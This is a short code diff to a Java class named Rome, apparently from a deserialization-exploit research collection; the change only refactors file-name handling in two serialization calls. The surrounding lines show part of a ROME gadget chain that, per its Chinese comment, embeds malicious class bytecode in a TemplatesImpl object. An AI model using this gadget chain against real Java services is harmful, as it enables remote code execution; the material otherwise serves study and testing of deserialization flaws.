@@ -14,8 +14,6 @@ import java.util.HashMap;
  */
 public class Rome {
 
-	public static String fileName = "Rome.bin";
-
 	public static void main(String[] args) throws Exception {
 
 		// 生成包含恶意类字节码的 TemplatesImpl 类
@@ -38,8 +36,8 @@ public class Rome {
 		field.setAccessible(true);
 		field.set(root, new EqualsBean(ObjectBean.class, delegate));
 
-		SerializeUtil.writeObjectToFile(map, fileName);
-		SerializeUtil.readFileObject(fileName);
+		SerializeUtil.writeObjectToFile(map);
+		SerializeUtil.readFileObject();
 	}
 
 }
